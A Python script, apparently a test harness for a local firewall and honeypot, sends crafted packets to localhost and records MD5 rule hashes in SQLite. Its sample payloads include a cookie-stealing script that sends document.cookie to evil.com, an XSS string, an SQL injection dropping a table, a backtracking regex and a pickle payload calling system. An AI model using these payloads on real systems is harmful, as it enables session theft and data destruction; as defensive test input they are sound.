import firewall
import analyzer
import socket
from scapy.all import *
import sqlite3
import hashlib

# Create a database connection for the rules
conn_rules = sqlite3.connect("rules.db")
cursor_rules = conn_rules.cursor()
cursor_rules.execute('''CREATE TABLE IF NOT EXISTS rules (ID INTEGER PRIMARY KEY, hash TEXT NOT NULL)''')

# Create a database connection for the content hash
conn_content = sqlite3.connect("content.db")
cursor_content = conn_content.cursor()
cursor_content.execute('''CREATE TABLE IF NOT EXISTS content (ID INTEGER PRIMARY KEY, hash TEXT NOT NULL)''')

def add_rule_to_table(data, cursor, table):
    md5_hash = hashlib.md5(data.encode('utf-8')).hexdigest()
    try:
        cursor.execute("INSERT INTO {} (hash) VALUES (?)".format(table), (md5_hash,))
        cursor.connection.commit()
        print("Rule added successfully.")
    except sqlite3.Error as e:
        print("Error adding rule:", e)


def send_packet(packet):
    server_address = '127.0.0.1'
    server_port = 5555

    # Create a raw socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        client_socket.connect((server_address, server_port))

        # Convert the packet to a bytes object
        raw_packet = bytes(packet)

        # Send the packet to the server
        client_socket.sendall(raw_packet)
        print("HTTP Packet sent successfully.")
    except Exception as e:
        print("Error:", e)
    finally:
        # Close the socket
        client_socket.close()
    
    honeypot_log_result = analyzer.getResult() 
    firewall_result = firewall.packet_process(packet)
    return (honeypot_log_result, firewall_result)


def decision(result):
    honeypot_log_result, firewall_result = result
    
    if honeypot_log_result:
        # Create a database connection for the rules
        conn_rules = sqlite3.connect("rules.db")
        cursor_rules = conn_rules.cursor()

        # Add a rule to the 'rules' table
        rule_data = "Example rule data"
        add_rule_to_table(rule_data, cursor_rules, 'rules')

        # Close the database connection
        conn_rules.close()

    if honeypot_log_result or firewall_result:
        return "DROP"
    else:
        return "OK"
    


if __name__ == "__main__":
    # Define malicious payloads
    html_payload = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Payload</title>
    </head>
    <body>
    <h1>Welcome to Our Website</h1>
    <p>This is a legitimate website.</p>
    <script>
      // Malicious script to steal cookies
      const maliciousScript = `
        <img src="http://evil.com/evil-image.jpg" onerror="fetch('http://evil.com/steal-cookie.php?cookie=' + document.cookie)">
      `;
      // Insert the malicious script into the page
      document.body.innerHTML += maliciousScript;
    </script>
    </body>
    </html>
    """

    json_payload = """
    {
        "name": "John Doe",
        "age": 30,
        "address": "<script>alert('XSS')</script>",
        "email": "john.doe@example.com",
        "sql_query": "SELECT * FROM users WHERE id = 1; DROP TABLE users;",
        "regex_pattern": "^([a-z]+)+$",
        "command": "ls -la",
        "file_path": "/var/www/html/index.php",
        "serialized_object": "cos\nsystem\n(S'echo hello'\ntR.",
        "crypto_algorithm": "MD5",
        "network_protocol": "http://example.com",
        "api_key": "API_KEY_HERE"
    }
    """

    # Create an HTTP packet with HTML payload
    http_packet = IP(dst="127.0.0.1") / TCP(dport=80) / Raw(load=html_payload)

    # Send the HTTP packet to the server and get results
    result = send_packet(http_packet)

    # Make a decision based on the results
    print(decision(result))
